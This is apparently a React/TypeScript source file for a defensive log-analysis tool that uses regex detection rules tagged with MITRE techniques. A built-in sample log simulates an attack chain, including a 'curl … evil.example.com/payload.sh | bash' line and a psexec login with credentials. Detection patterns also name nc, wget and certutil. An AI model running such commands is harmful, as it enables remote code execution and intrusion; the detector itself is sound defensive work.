/**
 * Log Correlation Engine — Upload/paste logs, detect brute force, lateral movement, anomalies.
 */
import { useState, useMemo } from "react";
import { FileText, Play, AlertTriangle, Check, Shield, Clock, Search, Upload } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";

interface LogAlert {
  type: string;
  severity: "critical" | "high" | "medium" | "low";
  description: string;
  evidence: string[];
  mitre: string;
}

const PATTERNS: { name: string; pattern: RegExp; severity: LogAlert["severity"]; mitre: string; threshold: number }[] = [
  { name: "Brute Force", pattern: /(?:failed|invalid|denied|unauthorized).*(?:login|auth|password|credential)/gi, severity: "high", mitre: "T1110", threshold: 5 },
  { name: "Privilege Escalation", pattern: /(?:sudo|su\s|root|admin|SYSTEM|NT AUTHORITY)/gi, severity: "critical", mitre: "T1078", threshold: 1 },
  { name: "Lateral Movement", pattern: /(?:psexec|wmic|winrm|ssh|rdp|smb|net\s+use)/gi, severity: "high", mitre: "T1021", threshold: 1 },
  { name: "Data Exfiltration", pattern: /(?:curl|wget|scp|ftp|nc\s|ncat|base64.*\|)/gi, severity: "high", mitre: "T1041", threshold: 1 },
  { name: "Reconnaissance", pattern: /(?:nmap|masscan|nikto|dirb|gobuster|enum4linux|net\s+view)/gi, severity: "medium", mitre: "T1046", threshold: 1 },
  { name: "Persistence", pattern: /(?:crontab|schtasks|registry|startup|autorun|systemctl\s+enable)/gi, severity: "high", mitre: "T1053", threshold: 1 },
  { name: "Defense Evasion", pattern: /(?:base64\s+-d|certutil|rundll32|regsvr32|mshta|wscript)/gi, severity: "high", mitre: "T1218", threshold: 1 },
  { name: "Error Spike", pattern: /(?:error|exception|panic|fatal|critical)/gi, severity: "medium", mitre: "N/A", threshold: 10 },
  { name: "Suspicious IP", pattern: /(?:10\.0\.0\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)/g, severity: "low", mitre: "T1016", threshold: 5 },
];

function analyzeLog(raw: string): { alerts: LogAlert[]; lineCount: number; ipAddresses: string[]; timestamps: string[] } {
  const lines = raw.split("\n").filter(l => l.trim());
  const alerts: LogAlert[] = [];

  for (const rule of PATTERNS) {
    const matches: string[] = [];
    for (const line of lines) {
      const found = line.match(rule.pattern);
      if (found) matches.push(line.trim().slice(0, 120));
    }
    if (matches.length >= rule.threshold) {
      alerts.push({
        type: rule.name,
        severity: rule.severity,
        description: `Detected ${matches.length} occurrences of ${rule.name} pattern (threshold: ${rule.threshold})`,
        evidence: matches.slice(0, 5),
        mitre: rule.mitre,
      });
    }
  }

  const ipPattern = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
  const allIps = raw.match(ipPattern) || [];
  const uniqueIps = [...new Set(allIps)];

  const tsPattern = /\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}/g;
  const timestamps = (raw.match(tsPattern) || []).slice(0, 20);

  return { alerts: alerts.sort((a, b) => { const o = { critical: 0, high: 1, medium: 2, low: 3 }; return o[a.severity] - o[b.severity]; }), lineCount: lines.length, ipAddresses: uniqueIps, timestamps };
}

const sevColor: Record<string, string> = {
  critical: "text-red-400 border-red-500/30 bg-red-500/5",
  high: "text-orange-400 border-orange-500/30 bg-orange-500/5",
  medium: "text-amber-400 border-amber-500/30 bg-amber-500/5",
  low: "text-blue-400 border-blue-500/30 bg-blue-500/5",
};

const SAMPLE_LOG = `2026-04-15T10:30:01Z sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
2026-04-15T10:30:02Z sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
2026-04-15T10:30:03Z sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
2026-04-15T10:30:04Z sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
2026-04-15T10:30:05Z sshd[12345]: Failed password for admin from 192.168.1.100 port 22 ssh2
2026-04-15T10:30:06Z sshd[12345]: Failed password for admin from 192.168.1.100 port 22 ssh2
2026-04-15T10:30:10Z sshd[12345]: Accepted password for root from 192.168.1.100 port 22 ssh2
2026-04-15T10:31:00Z root: sudo su - executed by admin
2026-04-15T10:32:00Z root: curl -s http://evil.example.com/payload.sh | bash
2026-04-15T10:33:00Z root: crontab -e
2026-04-15T10:34:00Z root: nmap -sV 10.0.0.0/24
2026-04-15T10:35:00Z kernel: error: segfault at 0x00000000
2026-04-15T10:36:00Z root: psexec \\\\10.0.0.50 -u admin -p pass cmd.exe`;

const LogCorrelationEngine = () => {
  const [raw, setRaw] = useState("");
  const [result, setResult] = useState<ReturnType<typeof analyzeLog> | null>(null);

  const handleAnalyze = () => {
    if (!raw.trim()) return;
    const r = analyzeLog(raw);
    setResult(r);
    toast.success(`Analyzed ${r.lineCount} lines — ${r.alerts.length} alerts`);
  };

  return (
    <div className="flex-1 overflow-y-auto">
      <div className="p-6 max-w-[1000px] mx-auto space-y-4">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-sm font-light tracking-[0.1em] text-foreground/80 uppercase">Log Correlation Engine</h2>
            <p className="text-[10px] text-muted-foreground/35 mt-0.5">Detect brute force, lateral movement, and anomalies in log data</p>
          </div>
          <div className="flex gap-2">
            <Button size="sm" variant="ghost" className="text-[9px] h-7" onClick={() => setRaw(SAMPLE_LOG)}>Load Sample</Button>
            <Button size="sm" onClick={handleAnalyze} disabled={!raw.trim()} className="text-[9px] h-7">
              <Play className="h-3 w-3 mr-1" />Analyze
            </Button>
          </div>
        </div>

        <Textarea value={raw} onChange={e => setRaw(e.target.value)} placeholder="Paste syslog, auth.log, or any log data..."
          className="min-h-[200px] text-xs font-mono bg-card/20 border-border/[0.08]" />

        {result && (
          <>
            {/* Summary */}
            <div className="grid grid-cols-4 gap-3">
              <div className="rounded-lg border border-border/[0.08] bg-card/20 p-3 text-center">
                <div className="text-lg font-light text-foreground/60">{result.lineCount}</div>
                <div className="text-[9px] text-muted-foreground/30 uppercase">Lines</div>
              </div>
              <div className="rounded-lg border border-border/[0.08] bg-card/20 p-3 text-center">
                <div className="text-lg font-light text-red-400">{result.alerts.length}</div>
                <div className="text-[9px] text-muted-foreground/30 uppercase">Alerts</div>
              </div>
              <div className="rounded-lg border border-border/[0.08] bg-card/20 p-3 text-center">
                <div className="text-lg font-light text-foreground/60">{result.ipAddresses.length}</div>
                <div className="text-[9px] text-muted-foreground/30 uppercase">Unique IPs</div>
              </div>
              <div className="rounded-lg border border-border/[0.08] bg-card/20 p-3 text-center">
                <div className="text-lg font-light text-foreground/60">{result.timestamps.length}</div>
                <div className="text-[9px] text-muted-foreground/30 uppercase">Timestamps</div>
              </div>
            </div>

            {/* Alerts */}
            {result.alerts.length > 0 && (
              <div className="space-y-2">
                <div className="text-[9px] text-muted-foreground/30 uppercase tracking-wider">Detected Threats</div>
                {result.alerts.map((a, i) => (
                  <div key={i} className={`rounded-lg border p-3 space-y-2 ${sevColor[a.severity]}`}>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <AlertTriangle className="h-3 w-3" />
                        <span className="text-[10px] font-medium">{a.type}</span>
                        {a.mitre !== "N/A" && <Badge variant="outline" className="text-[8px] h-4">{a.mitre}</Badge>}
                      </div>
                      <Badge variant="outline" className="text-[8px] h-4 uppercase">{a.severity}</Badge>
                    </div>
                    <p className="text-[9px] opacity-60">{a.description}</p>
                    <div className="space-y-0.5">
                      {a.evidence.map((e, j) => (
                        <div key={j} className="text-[9px] font-mono opacity-40 truncate">→ {e}</div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* IPs */}
            {result.ipAddresses.length > 0 && (
              <div className="rounded-lg border border-border/[0.08] bg-card/20 p-3">
                <div className="text-[9px] text-muted-foreground/30 uppercase tracking-wider mb-2">Extracted IP Addresses</div>
                <div className="flex flex-wrap gap-1.5">
                  {result.ipAddresses.map(ip => (
                    <Badge key={ip} variant="outline" className="text-[9px] font-mono bg-foreground/[0.02]">{ip}</Badge>
                  ))}
                </div>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default LogCorrelationEngine;
